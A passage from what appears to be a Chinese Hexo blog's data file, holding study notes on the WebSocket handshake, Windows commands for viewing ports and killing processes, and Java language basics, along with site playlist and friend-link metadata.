punctuation\">)</span>\n    <span class=\"token punctuation\">.</span><span class=\"token function\">digest</span><span class=\"token punctuation\">(</span><span class=\"token string\">'base64'</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n\nconsole<span class=\"token punctuation\">.</span><span class=\"token function\">log</span><span class=\"token punctuation\">(</span>secWebSocketAccept<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n<span class=\"token comment\" spellcheck=\"true\">// Oy4NRAQ13jhfONC7bP8dTKb4PTU=</span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>\n<script>\n        document.querySelectorAll('.github-emoji')\n          .forEach(el => {\n            if (!el.dataset.src) { return; }\n            const img = document.createElement('img');\n            img.style = 'display:none !important;';\n            img.src = el.dataset.src;\n            img.addEventListener('error', () => {\n              img.remove();\n              el.style.color = 'inherit';\n              el.style.backgroundImage = 'none';\n              el.style.background = 'none';\n            });\n            img.addEventListener('load', () => {\n              img.remove();\n            });\n            document.body.appendChild(img);\n          });\n      </script>","site":{"data":{"musics":[{"name":"故梦","artist":"双笙","url":"http://music.163.com/song/media/outer/url?id=409654891.mp3","cover":"http://p2.music.126.net/GZJY3Iz7TacxI3pr4jvQYQ==/18007801439911769.jpg?param=130y130"},{"name":"这个世界不会好","artist":"子默","url":"http://music.163.com/song/media/outer/url?id=571464961.mp3","cover":"http://p1.music.126.net/nzsUiw0881szTUdrgi5G1g==/109951165044907847.jpg?param=130y130"},{"name":"Beautiful World","artist":"Westlife","url":"http://music.163.com/song/media/outer/url?id=20707408.mp3","cover":"https://p2.music.126.net/MEWr-THANcYy-1jvx334_Q==/109951163167214019.jpg?param=130y130"},{"name":"River Flows in You","artist":"Yiruma","url":"http://music.163.com/song/media/outer/url?id=26237342.mp3","cover":"https://p2.music.126.net/8ZRSyI0ZN_4ah8uzsNd1mA==/2324367581169008.jpg?param=130y130"},{"name":"Hello My Love","artist":"Westlife","url":"http://music.163.com/song/media/outer/url?id=1338728670.mp3","cover":"https://p2.music.126.net/P2_COhPmlhsOpoj31DDLeA==/109951163785867445.jpg?param=130y130"},{"name":"If I Let You Go","artist":"Westlife","url":"http://music.163.com/song/media/outer/url?id=27220254.mp3","cover":"https://p2.music.126.net/TcOOoZSbISGT9AkhUtwOsg==/5644892697128237.jpg?param=130y130"},{"name":"Señorita","artist":"Shawn Mendes/Camila Cabello","url":"http://music.163.com/song/media/outer/url?id=1373168742.mp3","cover":"https://p2.music.126.net/eSrLKe5g3U8jX-lb629q6A==/109951164162885535.jpg?param=130y130"}],"galleries":[{"name":"背景图片3","cover":"背景图片/bg_pic_107.jpg","description":"背景图片","photos":["背景图片/bg_pic_101.jpg","背景图片/bg_pic_102.jpg","背景图片/bg_pic_103.jpg","背景图片/bg_pic_104.jpg","背景图片/bg_pic_105.jpg","背景图片/bg_pic_106.jpg","背景图片/bg_pic_107.jpg","背景图片/bg_pic_108.jpg","背景图片/bg_pic_109.jpg","背景图片/bg_pic_110.jpg","背景图片/bg_pic_111.jpg","背景图片/bg_pic_112.jpg","背景图片/bg_pic_113.jpg"]},{"name":"背景图片4","cover":"背景图片/bg_pic_130.jpg","description":"背景图片","photos":["背景图片/bg_pic_151.jpg","背景图片/bg_pic_152.jpg","背景图片/bg_pic_153.jpg","背景图片/bg_pic_154.jpg","背景图片/bg_pic_155.jpg","背景图片/bg_pic_156.jpg","背景图片/bg_pic_157.jpg","背景图片/bg_pic_158.jpg","背景图片/bg_pic_159.jpg","背景图片/bg_pic_160.jpg","背景图片/bg_pic_161.jpg","背景图片/bg_pic_162.jpg","背景图片/bg_pic_163.jpg","背景图片/bg_pic_164.jpg","背景图片/bg_pic_165.jpg"]}],"friends":[{"name":"Liloong3tの博客","introduction":"CTFer","url":"http://liloong3t.com","title":"去看看","avatar":"/favicon.png"},{"name":"wust-ais","url":"https://wust-ais.github.io/","title":"访问主页","introduction":"武汉科技大学信安协会欢迎您的加入！","avatar":"/medias/avatars/wust-ais.png"},{"name":"Blinkfox","url":"https://blinkfox.github.io","title":"前去学习","introduction":"闪烁之狐大佬做的hexo主题很棒，人也很好！","avatar":"https://blinkfox.github.io/medias/avatar.jpg"}]}},"excerpt":"","more":"<h1 id=\"WebSocket笔记\"><a href=\"#WebSocket笔记\" class=\"headerlink\" title=\"WebSocket笔记\"></a>WebSocket笔记</h1><h2 id=\"异步请求\"><a href=\"#异步请求\" class=\"headerlink\" title=\"异步请求\"></a>异步请求</h2><p>当浏览器向服务器发送同步请求时，<strong>服务器处理同步请求的过程中，浏览器会处于等待的状态</strong>，服务器处理完请求把数据响应给浏览器并覆盖浏览器内存中原有的数据，<strong>浏览器重新加载页面并展示服务器响应的数据</strong>。这是<strong>同步请求</strong>。如果这个过程比较漫长，用户会感觉界面“卡死了”。</p>\n<p>异步请求就是浏览器把请求交给<strong>代理对象—XMLHttpRequest</strong>（绝大多数浏览器都内置了这个对象），由代理对象向服务器发起请求，接收、解析服务器响应的数据，并把数据更新到浏览器指定的控件上。从而实现了<strong>页面数据的局部刷新</strong>。异步请求使浏览器<strong>不用等待服务器处理请求，不用重新加载整个页面来展示服务器响应的数据，在异步请求发送的过程中浏览器还能进行其它的操作</strong>。</p>\n<p>异步请求的执行流程图：</p>\n<p><img src=\"/img/14405984-ac876e7354969cab.jpg\" alt=\"img\"></p>\n<p>大多数用户交互都是使用异步响应体验更好，但有些特殊情况比如：银行转账或数据库更新等操作，优先使用同步响应，这样更安全，其中的道理不言自明。</p>\n<h2 id=\"WebSocket特点\"><a href=\"#WebSocket特点\" class=\"headerlink\" title=\"WebSocket特点\"></a>WebSocket特点</h2><p><a href=\"http://websocket.org/\" target=\"_blank\" rel=\"noopener\">WebSocket</a> 是一种网络通信协议。<a href=\"https://tools.ietf.org/html/rfc6455\" target=\"_blank\" rel=\"noopener\">RFC6455</a> 定义了它的通信标准。</p>\n<p>WebSocket 是 HTML5 开始提供的一种<strong>在单个 TCP 连接上进行全双工通讯</strong>的协议。</p>\n<p>由于HTTP是<strong>无连接的，且，只能由客户端发起</strong>，在一些场景下，HTTP并不能足以完成任务，所以需要建立和使用WebSocket双全工通讯协议。</p>\n<p>它的最大特点就是，服务器可以主动向客户端推送信息，客户端也可以主动向服务器发送信息，是真正的双向平等对话，属于<a href=\"https://en.wikipedia.org/wiki/Push_technology\" target=\"_blank\" rel=\"noopener\">服务器推送技术</a>的一种。</p>\n<p>其他特点包括：</p>\n<p>（1）建立在 TCP 协议之上，服务器端的实现比较容易。</p>\n<p>（2）与 HTTP 协议有着良好的兼容性。默认端口也是80和443，并且握手阶段采用 HTTP 协议，因此握手时不容易屏蔽，能通过各种 HTTP 代理服务器。</p>\n<p>（3）数据格式比较轻量，性能开销小，通信高效。</p>\n<p>（4）可以发送文本，也可以发送二进制数据。</p>\n<p>（5）没有同源限制，客户端可以与任意服务器通信。</p>\n<p>（6）协议标识符是<code>ws</code>（如果加密，则为<code>wss</code>），服务器网址就是 URL。</p>\n<h3 id=\"如何建立连接\"><a href=\"#如何建立连接\" class=\"headerlink\" title=\"如何建立连接\"></a>如何建立连接</h3><p>WebSocket复用了HTTP的握手通道。</p>\n<p>具体指的是，客户端通过HTTP请求与WebSocket服务端协商升级协议。协议升级完成后，后续的数据交换则遵照WebSocket的协议。</p>\n<h4 id=\"1、客户端：申请协议升级\"><a href=\"#1、客户端：申请协议升级\" class=\"headerlink\" title=\"1、客户端：申请协议升级\"></a>1、客户端：申请协议升级</h4><p>首先，客户端发起协议升级请求。可以看到，采用的是标准的HTTP报文格式，且只支持<code>GET</code>方法。</p>\n<pre><code class=\"http\">GET / HTTP/1.1\nHost: localhost:8080\nOrigin: http://127.0.0.1:3000\nConnection: Upgrade\nUpgrade: websocket            \nSec-WebSocket-Version: 13\nSec-WebSocket-Key: w4v7O6xFTi36lq3RNcgctw==</code></pre>\n<p>重点请求首部意义如下：</p>\n<ul>\n<li><code>Connection: Upgrade</code>：表示要升级协议</li>\n<li><code>Upgrade: websocket</code>：表示要升级到websocket协议。</li>\n<li><code>Sec-WebSocket-Version: 13</code>：表示websocket的版本。如果服务端不支持该版本，需要返回一个<code>Sec-WebSocket-Version</code>header，里面包含服务端支持的版本号。</li>\n<li><code>Sec-WebSocket-Key</code>：与后面服务端响应首部的<code>Sec-WebSocket-Accept</code>是配套的，提供基本的防护，比如恶意的连接，或者无意的连接。</li>\n</ul>\n<blockquote>\n<p>注意，上面请求省略了部分非重点请求首部。由于是标准的HTTP请求，类似Host、Origin、Cookie等请求首部会照常发送。在握手阶段，可以通过相关请求首部进行 安全限制、权限校验等。</p>\n</blockquote>\n<h4 id=\"2、服务端：响应协议升级\"><a href=\"#2、服务端：响应协议升级\" class=\"headerlink\" title=\"2、服务端：响应协议升级\"></a>2、服务端：响应协议升级</h4><p>服务端返回内容如下，状态代码<code>101</code>表示协议切换。到此完成协议升级，后续的数据交互都按照新的协议来。</p>\n<pre><code class=\"http\">HTTP/1.1 101 Switching Protocols\nConnection:Upgrade\nUpgrade: websocket\nSec-WebSocket-Accept: Oy4NRAQ13jhfONC7bP8dTKb4PTU=</code></pre>\n<blockquote>\n<p>备注：每个header都以<code>\\r\\n</code>结尾，并且最后一行加上一个额外的空行<code>\\r\\n</code>。此外，服务端回应的HTTP状态码只能在握手阶段使用。过了握手阶段后，就只能采用特定的错误码。</p>\n</blockquote>\n<h4 id=\"3、Sec-WebSocket-Accept的计算\"><a href=\"#3、Sec-WebSocket-Accept的计算\" class=\"headerlink\" title=\"3、Sec-WebSocket-Accept的计算\"></a>3、Sec-WebSocket-Accept的计算</h4><p><code>Sec-WebSocket-Accept</code>根据客户端请求首部的<code>Sec-WebSocket-Key</code>计算出来。</p>\n<p>计算公式为：</p>\n<ol>\n<li>将<code>Sec-WebSocket-Key</code>跟<code>258EAFA5-E914-47DA-95CA-C5AB0DC85B11</code>拼接。</li>\n<li>通过SHA1计算出摘要，并转成base64字符串。</li>\n</ol>\n<p>伪代码如下：</p>\n<pre><code class=\"javascript\">&gt;toBase64( sha1( Sec-WebSocket-Key + 258EAFA5-E914-47DA-95CA-C5AB0DC85B11 )  )</code></pre>\n<p>验证下前面的返回结果：</p>\n<pre><code class=\"javascript\">const crypto = require(&#39;crypto&#39;);\nconst magic = &#39;258EAFA5-E914-47DA-95CA-C5AB0DC85B11&#39;;\nconst secWebSocketKey = &#39;w4v7O6xFTi36lq3RNcgctw==&#39;;\n\nlet secWebSocketAccept = crypto.createHash(&#39;sha1&#39;)\n    .update(secWebSocketKey + magic)\n    .digest(&#39;base64&#39;);\n\nconsole.log(secWebSocketAccept);\n// Oy4NRAQ13jhfONC7bP8dTKb4PTU=</code></pre>\n"},{"layout":"post","title":"Windows上通过命令行查看端口和进程","date":"2020-11-30T16:00:00.000Z","description":"小知识，小笔记","typora-copy-images-to":"..\\img","typora-root-url":"..","_content":"\n# Windows上通过命令行查看端口和进程\n\n```shell\nnetstat -ano\t\t//查看所有端口上运行的服务和它的PID\n```\n\n-a            显示所有连接和侦听端口。\n\n -n            以数字形式显示地址和端口号。\n\n -o            显示拥有的与每个连接关联的进程 ID。\n\n```shell\ntaskkill /pid [PID] /f /t\t\t//通过PID强制终结进程及其子进程\n```\n\n/PID  processid        指定要终止的进程的 PID。\n                           使用 TaskList 取得 PID。\n\n/IM   imagename        指定要终止的进程的映像名称。通配符 '*'可用来\n                       指定所有任务或映像名称。\n\n/T                     终止指定的进程和由它启用的子进程。\n\n/F                     指定强制终止进程。\n\n```shell\ntasklist|findstr [PID|\"imagename\"]\n```\n\n通过PID或映像名称来查看进程（可以使用其中一个来查看另一个）\n\n","source":"_posts/2020-12-01-Windows上使用命令行查看进程.md","raw":"---\nlayout: post\ntitle: Windows上通过命令行查看端口和进程\ndate: 2020-12-01\ncategories: blog\ntags: [笔记，cmd]\ndescription: 小知识，小笔记\ntypora-copy-images-to: ..\\img\ntypora-root-url: ..\n---\n\n# Windows上通过命令行查看端口和进程\n\n```shell\nnetstat -ano\t\t//查看所有端口上运行的服务和它的PID\n```\n\n-a            显示所有连接和侦听端口。\n\n -n            以数字形式显示地址和端口号。\n\n -o            显示拥有的与每个连接关联的进程 ID。\n\n```shell\ntaskkill /pid [PID] /f /t\t\t//通过PID强制终结进程及其子进程\n```\n\n/PID  processid        指定要终止的进程的 PID。\n                           使用 TaskList 取得 PID。\n\n/IM   imagename        指定要终止的进程的映像名称。通配符 '*'可用来\n                       指定所有任务或映像名称。\n\n/T                     终止指定的进程和由它启用的子进程。\n\n/F                     指定强制终止进程。\n\n```shell\ntasklist|findstr [PID|\"imagename\"]\n```\n\n通过PID或映像名称来查看进程（可以使用其中一个来查看另一个）\n\n","slug":"2020-12-01-Windows上使用命令行查看进程","published":1,"updated":"2020-12-01T07:45:56.206Z","comments":1,"photos":[],"link":"","_id":"ckkntx9k8001wxov7vomp52s6","content":"<h1 id=\"Windows上通过命令行查看端口和进程\"><a href=\"#Windows上通过命令行查看端口和进程\" class=\"headerlink\" title=\"Windows上通过命令行查看端口和进程\"></a>Windows上通过命令行查看端口和进程</h1><pre class=\"line-numbers language-shell\"><code class=\"language-shell\">netstat -ano        //查看所有端口上运行的服务和它的PID<span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span></span></code></pre>\n<p>-a            显示所有连接和侦听端口。</p>\n<p> -n            以数字形式显示地址和端口号。</p>\n<p> -o            显示拥有的与每个连接关联的进程 ID。</p>\n<pre class=\"line-numbers language-shell\"><code class=\"language-shell\">taskkill /pid [PID] /f /t        //通过PID强制终结进程及其子进程<span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span></span></code></pre>\n<p>/PID  processid        指定要终止的进程的 PID。<br>                           使用 TaskList 取得 PID。</p>\n<p>/IM   imagename        指定要终止的进程的映像名称。通配符 ‘*’可用来<br>                       指定所有任务或映像名称。</p>\n<p>/T                     终止指定的进程和由它启用的子进程。</p>\n<p>/F                     指定强制终止进程。</p>\n<pre class=\"line-numbers language-shell\"><code class=\"language-shell\">tasklist|findstr [PID|\"imagename\"]<span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span></span></code></pre>\n<p>通过PID或映像名称来查看进程（可以使用其中一个来查看另一个）</p>\n<script>\n        document.querySelectorAll('.github-emoji')\n          .forEach(el => {\n            if (!el.dataset.src) { return; }\n            const img = document.createElement('img');\n            img.style = 'display:none !important;';\n            img.src = el.dataset.src;\n            img.addEventListener('error', () => {\n              img.remove();\n              el.style.color = 'inherit';\n              el.style.backgroundImage = 'none';\n              el.style.background = 'none';\n            });\n            img.addEventListener('load', () => {\n              img.remove();\n            });\n            document.body.appendChild(img);\n          });\n      </script>","site":{"data":{"musics":[{"name":"故梦","artist":"双笙","url":"http://music.163.com/song/media/outer/url?id=409654891.mp3","cover":"http://p2.music.126.net/GZJY3Iz7TacxI3pr4jvQYQ==/18007801439911769.jpg?param=130y130"},{"name":"这个世界不会好","artist":"子默","url":"http://music.163.com/song/media/outer/url?id=571464961.mp3","cover":"http://p1.music.126.net/nzsUiw0881szTUdrgi5G1g==/109951165044907847.jpg?param=130y130"},{"name":"Beautiful World","artist":"Westlife","url":"http://music.163.com/song/media/outer/url?id=20707408.mp3","cover":"https://p2.music.126.net/MEWr-THANcYy-1jvx334_Q==/109951163167214019.jpg?param=130y130"},{"name":"River Flows in You","artist":"Yiruma","url":"http://music.163.com/song/media/outer/url?id=26237342.mp3","cover":"https://p2.music.126.net/8ZRSyI0ZN_4ah8uzsNd1mA==/2324367581169008.jpg?param=130y130"},{"name":"Hello My Love","artist":"Westlife","url":"http://music.163.com/song/media/outer/url?id=1338728670.mp3","cover":"https://p2.music.126.net/P2_COhPmlhsOpoj31DDLeA==/109951163785867445.jpg?param=130y130"},{"name":"If I Let You Go","artist":"Westlife","url":"http://music.163.com/song/media/outer/url?id=27220254.mp3","cover":"https://p2.music.126.net/TcOOoZSbISGT9AkhUtwOsg==/5644892697128237.jpg?param=130y130"},{"name":"Señorita","artist":"Shawn Mendes/Camila Cabello","url":"http://music.163.com/song/media/outer/url?id=1373168742.mp3","cover":"https://p2.music.126.net/eSrLKe5g3U8jX-lb629q6A==/109951164162885535.jpg?param=130y130"}],"galleries":[{"name":"背景图片3","cover":"背景图片/bg_pic_107.jpg","description":"背景图片","photos":["背景图片/bg_pic_101.jpg","背景图片/bg_pic_102.jpg","背景图片/bg_pic_103.jpg","背景图片/bg_pic_104.jpg","背景图片/bg_pic_105.jpg","背景图片/bg_pic_106.jpg","背景图片/bg_pic_107.jpg","背景图片/bg_pic_108.jpg","背景图片/bg_pic_109.jpg","背景图片/bg_pic_110.jpg","背景图片/bg_pic_111.jpg","背景图片/bg_pic_112.jpg","背景图片/bg_pic_113.jpg"]},{"name":"背景图片4","cover":"背景图片/bg_pic_130.jpg","description":"背景图片","photos":["背景图片/bg_pic_151.jpg","背景图片/bg_pic_152.jpg","背景图片/bg_pic_153.jpg","背景图片/bg_pic_154.jpg","背景图片/bg_pic_155.jpg","背景图片/bg_pic_156.jpg","背景图片/bg_pic_157.jpg","背景图片/bg_pic_158.jpg","背景图片/bg_pic_159.jpg","背景图片/bg_pic_160.jpg","背景图片/bg_pic_161.jpg","背景图片/bg_pic_162.jpg","背景图片/bg_pic_163.jpg","背景图片/bg_pic_164.jpg","背景图片/bg_pic_165.jpg"]}],"friends":[{"name":"Liloong3tの博客","introduction":"CTFer","url":"http://liloong3t.com","title":"去看看","avatar":"/favicon.png"},{"name":"wust-ais","url":"https://wust-ais.github.io/","title":"访问主页","introduction":"武汉科技大学信安协会欢迎您的加入！","avatar":"/medias/avatars/wust-ais.png"},{"name":"Blinkfox","url":"https://blinkfox.github.io","title":"前去学习","introduction":"闪烁之狐大佬做的hexo主题很棒，人也很好！","avatar":"https://blinkfox.github.io/medias/avatar.jpg"}]}},"excerpt":"","more":"<h1 id=\"Windows上通过命令行查看端口和进程\"><a href=\"#Windows上通过命令行查看端口和进程\" class=\"headerlink\" title=\"Windows上通过命令行查看端口和进程\"></a>Windows上通过命令行查看端口和进程</h1><pre><code class=\"shell\">netstat -ano        //查看所有端口上运行的服务和它的PID</code></pre>\n<p>-a            显示所有连接和侦听端口。</p>\n<p> -n            以数字形式显示地址和端口号。</p>\n<p> -o            显示拥有的与每个连接关联的进程 ID。</p>\n<pre><code class=\"shell\">taskkill /pid [PID] /f /t        //通过PID强制终结进程及其子进程</code></pre>\n<p>/PID  processid        指定要终止的进程的 PID。<br>                           使用 TaskList 取得 PID。</p>\n<p>/IM   imagename        指定要终止的进程的映像名称。通配符 ‘*’可用来<br>                       指定所有任务或映像名称。</p>\n<p>/T                     终止指定的进程和由它启用的子进程。</p>\n<p>/F                     指定强制终止进程。</p>\n<pre><code class=\"shell\">tasklist|findstr [PID|&quot;imagename&quot;]</code></pre>\n<p>通过PID或映像名称来查看进程（可以使用其中一个来查看另一个）</p>\n"},{"layout":"post","title":"java学习笔记知识点","date":"2020-11-22T16:00:00.000Z","description":"应付Java考试","typora-copy-images-to":"..\\img","typora-root-url":"..","_content":"\n[TOC]\n\n\n\n#  java学习笔记知识点\n\n- 一个源文件中只能有一个 public 类\n- 一个源文件可以有多个非 public 类\n\n```java\nclass a{ class b{ }}\t\t这样是允许的\nclass a{}class b{}\t\t\t这样是不允许的\n```\n\n\n\n### 类型默认值\n\n Java 各个类型的默认值：\n\n| **数据类型**           | **默认值** |\n| :--------------------- | ---------- |\n| byte                   | 0          |\n| short                  | 0          |\n| int                    | 0          |\n| long                   | 0L         |\n| float                  | 0.0f       |\n| double                 | 0.0d       |\n| char                   | 'u0000'    |\n| String (or any object) | null       |\n| boolean                | false      |\n\nJava支持的一些转义字符序列。\n\n| 符号   | 字符含义                 |\n| :----- | :----------------------- |\n| \\n     | 换行 (0x0a)              |\n| \\r     | 回车 (0x0d)              |\n| \\f     | 换页符(0x0c)             |\n| \\b     | 退格 (0x08)              |\n| \\0     | 空字符 (0x0)             |\n| \\s     | 空格 (0x20)              |\n| \\t     | 制表符                   |\n| \\\"     | 双引号                   |\n| \\'     | 单引号                   |\n| \\\\     | 反斜杠                   |\n| \\ddd   | 八进制字符 (ddd)         |\n| \\uxxxx | 16进制Unicode字符 (xxxx) |\n\nJava语言支持的变量类型有：\n\n- 类变量：独立于方法之外的变量，用 static 修饰。\n- 实例变量：独立于方法之外的变量，不过没有 static 修饰。\n- 局部变量：类的方法中的变量。\n\n### final 修饰符\n\n**final 变量（常量）：**\n\nfinal 表示\"最后的、最终的\"含义，变量一旦赋值后，不能被重新赋值。被 final 修饰的实例变量必须显式指定初始值。\n\nfinal 修饰符通常和 static 修饰符一起使用来创建类常量。\n\n### abstract 修饰符\n\n**抽象类：**\n\n抽象类不能用来实例化对象，声明抽象类的唯一目的是为了将来对该类进行扩充。\n\n一个类不能同时被 abstract 和 final 修饰。如果一个类包含抽象方法，那么该类一定要声明为抽象类，否则将出现编译错误。\n\n抽象类可以包含抽象方法和非抽象方法。\n\n\n\n## 赋值运算符\n\n下面是Java语言支持的赋值运算符：\n\n| 操作符  | 描述                                                         | 例子                                     |\n| :------ | :----------------------------------------------------------- | :--------------------------------------- |\n| =       | 简单的赋值运算符，将右操作数的值赋给左侧操作数               | C = A + B将把A + B得到的值赋给C          |\n| + =     | 加和赋值操作符，它把左操作数和右操作数相加赋值给左操作数     | C + = A等价于C = C + A                   |\n| - =     | 减和赋值操作符，它把左操作数和右操作数相减赋值给左操作数     | C - = A等价于C = C - A                   |\n| * =     | 乘和赋值操作符，它把左操作数和右操作数相乘赋值给左操作数     | C * = A等价于C = C * A                   |\n| / =     | 除和赋值操作符，它把左操作数和右操作数相除赋值给左操作数     | C / = A，C 与 A 同类型时等价于 C = C / A |\n| （％）= | 取模和赋值操作符，它把左操作数和右操作数取模后赋值给左操作数 | C％= A等价于C = C％A                     |\n| << =    | 左移位赋值运算符                                             | C << = 2等价于C = C << 2                 |\n| >> =    | 右移位赋值运算符                                             | C >> = 2等价于C = C >> 2                 |\n| ＆=     | 按位与赋值运算符                                             | C＆= 2等价于C = C＆2                     |\n| ^ =     | 按位异或赋值操作符                                           | C ^ = 2等价于C = C ^ 2                   |\n| \\| =    | 按位或赋值操作符                                             | C \\| = 2等价于C = C \\| 2                 |\n\n## instanceof 运算符\n\n该运算符用于操作对象实例，检查该对象是否是一个特定类型（类类型或接口类型）。\n\ninstanceof运算符使用格式如下：\n\n```\n( Object reference variable ) instanceof  (class/interface type)\n```\n\n如果运算符左侧变量所指的对象，是操作符右侧类或接口(class/interface)的一个对象，那么结果为真。\n\n下面是一个例子：\n\n```\nString name = \"James\";\nboolean result = name instanceof String; // 由于 name 是 String 类型，所以返回真\n```\n\n如果被比较的对象兼容于右侧类型,该运算符仍然返回true。\n\n看下面的例子：\n\n```java\nclass Vehicle {}\n \npublic class Car extends Vehicle {\n   public static void main(String[] args){\n      Vehicle a = new Car();\n      boolean result =  a instanceof Car;\n      System.out.println( result);\n   }\n}\n```\n\n## Java 增强 for 循环\n\nJava5 引入了一种主要用于数组的增强型 for 循环。\n\nJava 增强 for 循环语法格式如下:\n\nfor(声明语句 : 表达式) {   //代码句子 }\n\n**声明语句：**声明新的局部变量，该变量的类型必须和数组元素的类型匹配。其作用域限定在循环语句块，其值与此时数组元素的值相等。\n\n**表达式：**表达式是要访问的数组名，或者是返回值为数组的方法。\n\n**实例：**\n\n```java\npublic class Test {\n   public static void main(String args[]){\n      int [] numbers = {10, 20, 30, 40, 50};\n \n      for(int x : numbers ){\n         System.out.print( x );\n         System.out.print(\",\");\n      }\n      System.out.print(\"\\n\");\n      String [] names ={\"James\", \"Larry\", \"Tom\", \"Lacy\"};\n      for( String name : names ) {\n         System.out.print( name );\n         System.out.print(\",\");\n      }\n   }\n}\n```\n\n\n\n## String类\n\njava的String类一般定义后不再改变（字符串），要频繁修改，使用StringBuffer 和 StringBuilder 类\n\njava的字符数组可以直接用new String()方式转换成字符串。\n\n## Java StringBuffer 和 StringBuilder 类\n\n\n\n当对字符串进行修改的时候，需要使用 StringBuffer 和 StringBuilder 类。\n\n和 String 类不同的是，StringBuffer 和 StringBuilder 类的对象能够被多次的修改，并且不产生新的未使用对象。\n\nStringBuilder 类在 Java 5 中被提出，它和 StringBuffer 之间的最大不同在于 StringBuilder 的方法不是线程安全的（不能同步访问）。\n\n由于 StringBuilder 相较于 StringBuffer 有速度优势，所以多数情况下建议使用 StringBuilder 类。然而在应用程序要求线程安全的情况下，则必须使用 StringBuffer 类。\n\n## JAVA的Main函数\n\n### public static void main(String[] args)\n\n如果要调用其他类的main函数，只要像调用它的公有方法一样就行，但要记得必须带上一个String字符串参数（new []String{}）。\n\n另，由于main函数是静态方法，所以调用时并不需要对象实例。\n\n例：\n\nTest.java\n\n```java\npublic class Test {\n    public static void main(String[] args) {\n//        int x=10;\n        int[] str={1,2,3,4,5};\n        for(int i:str)\n        {\n            System.out.println(\"这个数现在为：\"+i);\n        }\n    }\n}\n\n```\n\nTestTest.java\n\n```java\npublic class TestTest {\n    public static void main(String[] args) {\n//        Test test=new Test();\n        Test.main(new String[]{});\n    }\n}\n```\n\n运行结果：\n\n```shell\nD:\\JDK\\8\\bin\\java.exe TestTest\n这个数现在为：1\n这个数现在为：2\n这个数现在为：3\n这个数现在为：4\n这个数现在为：5\n```\n\n1. #### public\n\n   访问修饰符，public表示可访问权限最高。\n\n2. #### static\n\n   static关键字是重点。\n   static关键字用来修饰静态成员变量或者方法。\n\n   通俗的说，static表示其修饰的成员变量或方法不需要实例化类就可以使用。也就是说，static变量不依赖于类的任何实例，只要类被加载(加载不等于实例化)，jvm（java虚拟机）就可以直接找到他们而不需要创建关于类的任何对象。\n   static关键字前可以有修饰符进行修饰，当使用public static时，其实相当于创建了一个**全局变量(方法)**。\n   再来看static修饰的代码块(即为static {…}形式的)，也叫做静态代码块。概念不必多讲，静态代码块有一个非常重要的特点：\n\n   **随着类的加载而执行且只执行一次**。\n   静态代码块可以有多个，位置可以随便放，它不在任何的方法体内，jvm加载类时会优先执行这些静态的代码块，如果static代码块有多个，jvm将按照它们在类中出现的先后顺序依次执行它们，每个代码块只会被执行一次。\n\n   那么main函数前加public static的意义是什么呢？意义就是这样的话，在当前类还未实例化的时候，可以运行main函数。\n\n3. #### void\n\n   与C系语言不同的是，java语言默认都是正常状态结束。也就是System.exit(0)，异常结束是1。所以，java的主方法没有必要存在返回值，即void。\n\n4. #### main\n\n   沿袭C系列main命名的主函数。\n\n5. #### String[]\n\n   使用命令行运行class文件的时候是可以附加参数的，懂得都懂，比如 Terminal>java HelloWorld test  这种写法。test会作为参数传入mian方法。因为参数并不仅限一个，所以定义成数组格式。\n\n   但在IDE中运行Java程序还是必须得在main函数中加上String[] args，否则main函数无法运行。\n\n   **用String数组得原因：**\n   String作为java中最万能的包装类具有普遍性。天地万物都可以解释成String，String也可以解析成天地万物，所以用String来存放参数自然是最优选择。\n   ps.在java 1.5以后，String[]完全可以写成String…(不定项参数)，不妨试一下。\n\n6. #### args\n\n   计算机领域用来表示参数的变量名其实就那么几个，params，args算是约定俗成的了。其实完全可以叫abc，这个想怎么叫就怎么叫。\n\n## Java 流(Stream)、文件(File)和IO\n\nJava.io 包几乎包含了所有操作输入、输出需要的类。所有这些流类代表了输入源和输出目标。\n\nJava.io 包中的流支持很多种格式，比如：基本类型、对象、本地化字符集等等。\n\n一个流可以理解为一个数据的序列。输入流表示从一个源读取数据，输出流表示向一个目标写数据。\n\n### 读取控制台输入\n\nJava 的控制台输入由 System.in 完成。\n\n为了获得一个绑定到控制台的字符流，需要把 System.in 包装在一个 BufferedReader 对象中来创建一个字符流。\n\n```java\nBufferedReader br = new BufferedReader(new \n                      InputStreamReader(System.in));\n```\n\n**BufferedReader** 对象创建后，便可以使用 **read()** 方法从控制台读取一个字符，或者用 **readLine()** 方法读取一个字符串。\n\n### 控制台输出\n\n控制台的输出由 print( ) 和 println() 完成，这些方法都由类 PrintStream 定义，System.out 是该类对象的一个引用。\n\nPrintStream 继承了 OutputStream类，并且实现了方法 write()。这样，write() 也可以用来往控制台写操作。\n\n```java\n//用 write() 把字符 \"A\" 和紧跟着的换行符输出到屏幕\nimport java.io.*;\n \n//演示 System.out.write().\npublic class WriteDemo {\n    public static void main(String args[]) {\n        int b;\t\t//用char也行\n        b = 'A';\n        System.out.write(b);\n        System.out.write('\\n');\n    }\n}\n```\n\nwrite() 方法不经常使用，因为 print() 和 println() 方法用起来更为方便。\n\n### 读写文件\n\n下图是一个描述输入流和输出流的类层次图。\n\n![img](/img/iostream2xx.png)\n\n## Java 异常处理\n\n异常是程序中的一些错误，但并不是所有的错误都是异常，并且错误有时候是可以避免的。\n\n比如说，你的代码少了一个分号，那么运行出来结果是提示是错误 java.lang.Error；如果你用System.out.println(11/0)，那么你是因为你用0做了除数，会抛出 java.lang.ArithmeticException 的异常。\n\n异常发生的原因有很多，通常包含以下几大类：\n\n- 用户输入了非法数据。\n- 要打开的文件不存在。\n- 网络通信时连接中断，或者JVM内存溢出。\n\n这些异常有的是因为用户错误引起，有的是程序错误引起的，还有其它一些是因为物理错误引起的。-\n\n要理解Java异常处理是如何工作的，你需要掌握以下三种类型的异常：\n\n- **检查性异常：**最具代表的检查性异常是用户错误或问题引起的异常，这是程序员无法预见的。例如要打开一个不存在文件时，一个异常就发生了，这些异常在编译时不能被简单地忽略。\n- **运行时异常：** 运行时异常是可能被程序员避免的异常。与检查性异常相反，运行时异常可以在编译时被忽略。\n- **错误：** 错误不是异常，而是脱离程序员控制的问题。错误在代码中通常被忽略。例如，当栈溢出时，一个错误就发生了，它们在编译也检查不到的。\n\n异常类有两个主要的子类：IOException 类和 RuntimeException 